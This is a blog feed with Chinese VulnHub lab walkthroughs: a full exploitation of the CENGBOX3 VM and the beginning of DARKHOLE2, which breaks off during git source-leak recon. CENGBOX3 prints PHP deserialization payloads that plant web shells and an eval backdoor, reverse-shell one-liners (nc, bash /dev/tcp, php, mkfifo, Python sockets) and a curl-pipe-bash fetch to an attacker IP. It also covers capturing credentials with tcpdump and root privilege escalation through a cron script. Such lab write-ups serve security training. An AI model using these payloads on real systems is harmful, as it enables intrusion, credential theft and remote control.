{
    "version": "https://jsonfeed.org/version/1",
    "title": "X_T • All posts by \"vulnhub 41-50\" tag",
    "description": "人生如逆旅，我亦是行人",
    "home_page_url": "http://www.n1h1l157.live",
    "items": [
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/141%20CENGBOX3/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/141%20CENGBOX3/",
            "title": "VULNHUB 41 CENGBOX3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VuZ2JveC0zLDU3Ni8=\">https://www.vulnhub.com/entry/cengbox-3,576/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE4MDE1OTA3\">https://blog.csdn.net/weixin_50688050/article/details/118015907</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3ltOTQ1L3AvMTQzMDM3MjguaHRtbA==\">https://www.cnblogs.com/sym945/p/14303728.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 CENGBOX3：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1121.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80,443</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTYv\">http://192.168.31.96/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1122.png\" width=\"620\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjMxLjk2Lw==\">https://192.168.31.96/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1123.png\" width=\"620\" alt=\"Image\">\n<p>点击隐藏详情，输入 thisisunsafe 即可进入该站点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1124.png\" width=\"620\" alt=\"Image\">\n<p>扫描目录:<br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.96/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1125.png\" width=\"660\" alt=\"Image\">\n<p>没有找到有价值的目标，得去尝试一下 443 端口的网站有没有什么敏感目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://192.168.31.96/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1126.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"nmamp-端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#nmamp-端口扫描\">#</a> nmamp 端口扫描</h3>\n<blockquote>\n<p>发现 gobuster 无法爆破此类网址，只能另寻它法，按理说 web 站点必有破绽才能进一步渗透，但是现在的 web 没有任何的突破口，是不是我们从端口扫描那里就出现了问题这次通过 - A 参数详细的扫描一波端口信息，看能否获得更多的信息</p>\n</blockquote>\n<p><code>sudo nmap -A -p- 192.168.31.96</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1127.png\" width=\"660\" alt=\"Image\">\n<p>发现了一个 ceng-company.vm 的字样，这个可以做为 hosts 做 DNS 解析，修改本地 hosts 文件，将此域名的 DNS 解析指向 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1128.png\" width=\"260\" alt=\"Image\">\n<p>解析成功了，可以直接访问这个域名了，接下来就对这个域名做测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1129.png\" width=\"620\" alt=\"Image\">\n<p>首先就是测试目录，看有哪些目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://ceng-company.vm/](http://ceng-company.vm/)</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1130.png\" width=\"700\" alt=\"Image\">\n<p>还是这几个目录，没有多大的作用，下一步对域名做一个子域名扫描</p>\n<h3 id=\"gobuster-爆破子域名\"><a class=\"markdownIt-Anchor\" href=\"#gobuster-爆破子域名\">#</a> gobuster 爆破子域名</h3>\n<p>爆破子域名的时候选用 vhost 参数，字典可以根据自己的习惯选择这里使用的是 seclists 中的一个子域名爆破字典<br>\n <code>gobuster vhost -u [http://ceng-company.vm/](http://ceng-company.vm/) -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1131.png\" width=\"570\" alt=\"Image\">\n<p>也可以选用较大的字典爆破子域名  <code>gobuster vhost -u http://ceng-company.vm/ -w /usr/share/wordlists/dirb/big.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1132.png\" width=\"620\" alt=\"Image\">\n<p>找到一个子域名，同样修改本地 hosts 文件，改变 DNS 解析指向</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1133.png\" width=\"290\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0=\">http://dev.ceng-company.vm</span> 做信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1134.png\" width=\"620\" alt=\"Image\">\n<p>同样的先来做一波目录扫描</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.ceng-company.vm/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1135.png\" width=\"660\" alt=\"Image\">\n<p>没有什么敏感的目录，目录扫描无法得到更多有效的线索</p>\n<h3 id=\"sqlmap-注入\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-注入\">#</a> sqlmap 注入</h3>\n<p>既然这个子域名的首页是登录框，登录框就可以尝试使用 sql 注入，通过 burp 将数据包拦截，复制该数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1136.png\" width=\"520\" alt=\"Image\">\n<p>通过 sqlmap 指定发送数据为此数据包中的内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1137.png\" width=\"700\" alt=\"Image\">\n<p><code>sqlmap -r login.txt --batch --dbs</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1138.png\" width=\"700\" alt=\"Image\">\n<p>直接爆破的时候是失败的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1139.png\" width=\"700\" alt=\"Image\">\n<p>指定注入点是 username 时再次尝试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1140.png\" width=\"700\" alt=\"Image\">\n<p>指定注入点是 passwd 时再次尝试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1141.png\" width=\"700\" alt=\"Image\">\n<p>前面几种方式都试了，试不出来此地方是存在 sql 注入的，没有找到其余人是怎么通过这个点拿到数据库的信息的，数据库中的信息如下，可通过下列两个账号登陆到后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1142.png\" width=\"420\" alt=\"Image\">\n<p><code>admin@ceng-company.vm：admin*_2020</code> <br>\n <code>elizabethsky@ceng-company.vm：walnuttree</code></p>\n<h3 id=\"php反序列化漏洞\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化漏洞\">#</a> php 反序列化漏洞</h3>\n<p>进入比较高权限的 admin 的后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1143.png\" width=\"660\" alt=\"Image\">\n<p>这里有一个可以输入的地方，输入 1,2,3 尝试是否有回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1144.png\" width=\"660\" alt=\"Image\">\n<p>提交之后，显示发送成功，并且有一个链接可以跳转</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1145.png\" width=\"660\" alt=\"Image\">\n<p>此链接显示了 1,3 位置的数据，我们可以放一些恶意 payload 尝试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1146.png\" width=\"520\" alt=\"Image\">\n<p>在输入框依次填写如下内容，看 phpinfo 是否会被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1147.png\" width=\"660\" alt=\"Image\">\n<p>回显中并没有 phpinfo 的信息，只留下来了第三个位置的数字</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1148.png\" width=\"520\" alt=\"Image\">\n<p>把 phpinfo 放在第三个位置看看有没有什么回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1149.png\" width=\"620\" alt=\"Image\">\n<p>看来 phpinfo 的信息没有被执行，跟 1,3 的位置无关</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1150.png\" width=\"470\" alt=\"Image\">\n<p>查看源码里，只是以一种字符串的形势存在</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1151.png\" width=\"320\" alt=\"Image\">\n<h3 id=\"php反序列化-get\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化-get\">#</a> php 反序列化 GET</h3>\n<p>仔细观察 url 地址，发现是一个 url 编码后的地址<br>\n通过在线 url 解码：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5hYjE3My5jb20vZW5jL3VybGVuY29kZS5waHA=\">http://www.ab173.com/enc/urlencode.php</span></p>\n<p><code>http://dev.ceng-company.vm/addpoem.php?data=O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:1:&quot;1&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/poem.txt&quot;;s:8:&quot;poemName&quot;;s:1:&quot;1&quot;;&#125;s:9:&quot;poemLines&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1152.png\" width=\"700\" alt=\"Image\">\n<p>发现这就是一个 php 反序列化漏洞，在我们要上传的 phpinfo 的地方出构造一 GET 方法，通过该 GET 方法调用 php 执行系统命令</p>\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:4:&quot;ada&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/poem.php&quot;;s:8:&quot;poemName&quot;;s:47:&quot;&lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:4:&quot;adadd&quot;;&#125;</code></p>\n<p>表示往主站 poem.php 写入一个 cmd 的 GET 方法，方法中的内容用系统执行</p>\n<p>将此内容进行 url 编码后添加到 <span class=\"exturl\" data-url=\"aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0vYWRkcG9lbS5waHA/ZGF0YT0=\">http://dev.ceng-company.vm/addpoem.php?data=</span> 执行之后没有报错，poem.php 文件写入成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1153.png\" width=\"660\" alt=\"Image\">\n<p>执行 id 方法，输出 id 的一些信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1154.png\" width=\"440\" alt=\"Image\">\n<p>查看 ifconfig 的 ip 信息时，通过查看源代码也能很方便的看到</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1155.png\" width=\"620\" alt=\"Image\">\n<p>现在这个地方已经被升级成为了 RCE 命令执行漏洞，查看服务器有下列哪些反弹 shell 的命令</p>\n<p><code>http://ceng-company.vm/poem.php?cmd=which%20python;which%20nc;which%20curl;which%20wget;which%20php</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1156.png\" width=\"660\" alt=\"Image\">\n<p>发现存在 nc，curl，wget，php 可以依次尝试使用反弹 shell 的命令</p>\n<h3 id=\"反弹shell总结\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell总结\">#</a> 反弹 shell 总结</h3>\n<p><code>nc 192.168.31.84 4445 -e /bin/bash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1157.png\" width=\"660\" alt=\"Image\">\n<p><code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31. 84 /444 5 0&gt;&amp;1'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1158.png\" width=\"660\" alt=\"Image\">\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.31. 84 /444 5 0&gt;&amp;1</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1159.png\" width=\"660\" alt=\"Image\">\n<p><code>php -r '$sock=fsockopen(&quot;192.168.31. 84 &quot;,444 5 );exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1160.png\" width=\"660\" alt=\"Image\">\n<p>如果有服务器的话，可以直接接服务器的马执行，这里我没有开启远程公网 ip 上的服务器，就直接在本地开了一个简易的 web</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在 192.168.31.25的机器上</span></span><br><span class=\"line\">cat &gt; shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.84/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">python 3 -m httpserver 80</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在 192.168.31. 84 的机器上</span></span><br><span class=\"line\">nc - lvvp 4444</span><br></pre></td></tr></table></figure>\n<p>通过网站去执行：curl <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjUvc2hlbGwuc2g=\">http://192.168.31.25/shell.sh</span> | bash<br>\n 表示加载 shell.sh 的内容之后用 bash 去执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1161.png\" width=\"660\" alt=\"Image\">\n<p>最后通过 curl 的方式拿到了 webshell，利用相关代码进行标准 shell 的输出</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1162.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"php反序列化-post\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化-post\">#</a> php 反序列化 POST</h3>\n<p>既然我们可以通过 GET 型的注入升级为 RCE，看看有没有其他的方法，先搞一个简单的 phpinfo 给指定路径上传 phpinfo 进行执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1163.png\" width=\"700\" alt=\"Image\">\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:18:&quot;/var/www/html/x.php&quot;;s:8:&quot;poemName&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>\n<p>意指往主站 x.php 上打印一个<?php phpinfo();?>的记录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1164.png\" width=\"700\" alt=\"Image\">\n<p>url 编码后去执行这个 x.php，回显出来了 phpinfo 的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1165.png\" width=\"660\" alt=\"Image\">\n<p>用 post 型参数，上传一句话后门到主站的 y.php</p>\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/y.php&quot;;s:8:&quot;poemName&quot;;s:27:&quot;&lt;?php @eval($_POST['x']);?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1166.png\" width=\"700\" alt=\"Image\">\n<p>url 编码后通过 url 执行，成功写到网站根目录上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1167.png\" width=\"700\" alt=\"Image\">\n<p>POST 型木马可以通过蚁剑等工具直接链接，地址是主站的 y.php，密码是 x</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1168.png\" width=\"660\" alt=\"Image\">\n<p>通过写如下新文件，将服务器的 shell 反弹出来<br>\n <code>&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 &gt;/tmp/f&quot;);?&gt;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1169.png\" width=\"700\" alt=\"Image\">\n<blockquote>\n<p>指的是如果存在命名管道 /tmp/f 先删掉它，然后新建一个命名管道 /tmp/f<br>\n 并且通过 cat 往命名管道中打印 /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 这个命令<br>\n /bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 表示用 sh 强制交互式执行并将输出<br>\n结果重定向，然后将输出内容反弹到 192.168.31.84 的 4445 端口上</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1170.png\" width=\"440\" alt=\"Image\">\n<p>对终端进行调整，输出一个较为美观的终端</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1171.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"php反序列化-mkfifo\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化-mkfifo\">#</a> php 反序列化 mkfifo</h3>\n<p>既然可以通过 POST 间接的使用 mkfifo 注入 RCE，那么是否可以直接在 php 反序列化里边直接上传 mkfifo 的命令反弹 shell 呢，尝试一下</p>\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/z.php&quot;;s:8:&quot;poemName&quot;;s:100:&quot;&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.135 4444 &gt;/tmp/f&quot;);?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1172.png\" width=\"700\" alt=\"Image\">\n<p>提示上传成功了，但是在 z.php 执行的时候失败的，这种方法可能被过滤掉了，因此目前只有通过注入 GET 参数，在 url 界面使用 curl 反弹或者注入 POST 参数，在蚁剑中用 mkfifo 的方式反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1173.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"tcpdump抓取数据包\"><a class=\"markdownIt-Anchor\" href=\"#tcpdump抓取数据包\">#</a> tcpdump 抓取数据包</h3>\n<p>对 webshell 做一个 pspy 监控看有没有定时任务</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1174.png\" width=\"520\" alt=\"Image\">\n<p>追踪定期执行的任务 /opt/login.py, 只有拿到 eric 的权限才能查看</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1175.png\" width=\"330\" alt=\"Image\">\n<p>既然是登陆的脚本，肯定是有数据传送的，看了一下服务器上是存在 tcpdump 的，可以借用这个工具来监视数据包的传输，说不定能在数据包里有发现  <code>tcpdump -i lo -w login.pcapng</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1176.png\" width=\"540\" alt=\"Image\">\n<p>抓了大概三分钟的数据之后将 login.pcapng 发送至 kali 上目标 webshell 上不存在 scp 命令也无法通过 python 的简易 web 打开</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1177.png\" width=\"480\" alt=\"Image\">\n<p>就将这个文件移动到了 /var/www/html 中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1178.png\" width=\"520\" alt=\"Image\">\n<p>直接通过浏览器打开这个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1179.png\" width=\"660\" alt=\"Image\">\n<p>页面中存在着 eric 的用户名和密码 <code>3ricThompson%2ACovid19</code> ，但是后面还有一些奇怪的字符，不足以确定密码是多少，还是下载下来分析一番</p>\n<h3 id=\"uid0的定时任务反弹\"><a class=\"markdownIt-Anchor\" href=\"#uid0的定时任务反弹\">#</a> UID=0 的定时任务反弹</h3>\n<p>用 kali 机器下载此文件，用 strings 分析，得到了 <code>3ricThompson%2ACovid19</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1180.png\" width=\"420\" alt=\"Image\">\n<p>但是 %2A 出现在这个密码中很突兀，可能是编码原因导致原来的特殊符号在数据传输过程中发生了转码，解码之后得到其是 *</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1181.png\" width=\"320\" alt=\"Image\">\n<p>用下列两个方式尝试登陆服务器拿到了 eric 的权限<br>\n <code>eric: 3ricThompson%2ACovid19</code>   <code>eric: 3ricThompson*Covid19</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1182.png\" width=\"420\" alt=\"Image\">\n<p>找到 login.py 看到漏洞形成的原因就是因为其往本地发送了一些登陆的数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1183.png\" width=\"410\" alt=\"Image\">\n<p>在 /opt 下还有两个文件是跟 root 账户相关的，<span class=\"exturl\" data-url=\"aHR0cDovL2NoZWNoLnhuLS1zaHdoYXRpc215aXAtZGUwdTMyM2dxcXRxMG4ybDVsLnB5\">chech.sh 就是去执行 whatismyip.py</span>，而 whatismyip.py 就是得到公网 ip</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1184.png\" width=\"340\" alt=\"Image\">\n<p>通过 pspy 监控，发现定期执行的 login.py 是用 UID=0 的用即 root 权限执行的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1185.png\" width=\"550\" alt=\"Image\">\n<p>eric 用户有对 login.py 的改写权限，改写 login.py 文件，通过 py 反弹 shell</p>\n<p><code>echo &quot;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.84',4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')&quot; &gt; login.py</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1186.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 最终拿到了 root 用户，</p>\n<h3 id=\"vim全屏stty\"><a class=\"markdownIt-Anchor\" href=\"#vim全屏stty\">#</a> vim 全屏 stty</h3>\n<p>但是我么去用 vim 包括使用命令的时候往往输入了一部分内容之后就不能在再同一行继续输入了，这个美观问题经常很头疼。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1187.png\" width=\"420\" alt=\"Image\">\n<blockquote>\n<p>可以重设 stty 的大小，来将反弹得到的 shell 按照自己的 shell 的 stty 来标准化，自己当前的 stty 有多大就将其改为多大<br>\n通过 python 先输出一个标准的 shell  <code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code> <br>\n 输入 ctrl+z 让其后台运行<br>\n查看自己当前开启的终端的大小  <code>stty - a</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1188.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>设置 stty 为 raw 模式，并前台启动后台运行的程序 <code>stty raw -echo;fg</code> <br>\n 并输入回车两次<br>\n输入 reset 重置 stty，如提示找不到 terminal 的类型，就设置为 xterm</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1189.png\" width=\"380\" alt=\"Image\">\n<p>根据查到的终端大小设置反弹 shell 的终端的 stty <code>stty rows 25 columns 79</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1190.png\" width=\"300\" alt=\"Image\">\n<p>现在我们所使用的终端就比较工整了，vim 也能全屏使用了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1191.png\" width=\"470\" alt=\"Image\">\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/",
            "title": "VULNHUB 42 DARKHOLE2",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGFya2hvbGUtMiw3NDAv\">https://www.vulnhub.com/entry/darkhole-2,740/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2RkLWJsb2cvcC8xNTIzMDgyNi5odG1s\">https://www.cnblogs.com/wdd-blog/p/15230826.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 DARKHOLE2：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1) 确定靶机 ip 地址和开放的端口</p>\n<p>由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1192.png\" width=\"700\" alt=\"Image\">\n<p>2) 再次对其开放的端口进行详细的扫描</p>\n<p><code>sudo nmap -A -p- 192.168.31.12 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1193.png\" width=\"560\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31. 12 、靶机开放端口 22,80</p>\n<p>-&gt; 并且扫描到了再 80 端口上是存在 git 源码泄漏的</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTI=\">http://192.168.31.12</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1194.png\" width=\"520\" alt=\"Image\">\n<p>扫描目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1195.png\" width=\"520\" alt=\"Image\">\n<p>依次对得到的目录信息进行访问搜索有价值的信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvbG9naW4ucGhw\">http://192.168.31.12/login.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1196.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvZGFzaGJvYXJkLnBocA==\">http://192.168.31.12/dashboard.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1197.png\" width=\"420\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnLw==\">http://192.168.31.12/config/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1198.png\" width=\"400\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnL2NvbmZpZy5waHA=\">http://192.168.31.12/config/config.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1199.png\" width=\"510\" alt=\"Image\">\n<p>通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，和一个不被允许进入的 dashboard.php 两个信息</p>\n<h3 id=\"git源码泄漏利用\"><a class=\"markdownIt-Anchor\" href=\"#git源码泄漏利用\">#</a> .git 源码泄漏利用</h3>\n<p>在端口扫描阶段因为有.git 的信息，对.git 进行访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=\"> http://192.168.31.12/.git/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1200.png\" width=\"320\" alt=\"Image\">\n<p>利用 githack 对源码泄漏进行利用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1201.png\" width=\"520\" alt=\"Image\">\n<p><code>wget https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip -O Githack.zip -q;unzip -q Githack.zip;cd GitHack-master;</code> <br>\n <code>python3 GitHack.py http://192.168.31.12/.git</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1202.png\" width=\"660\" 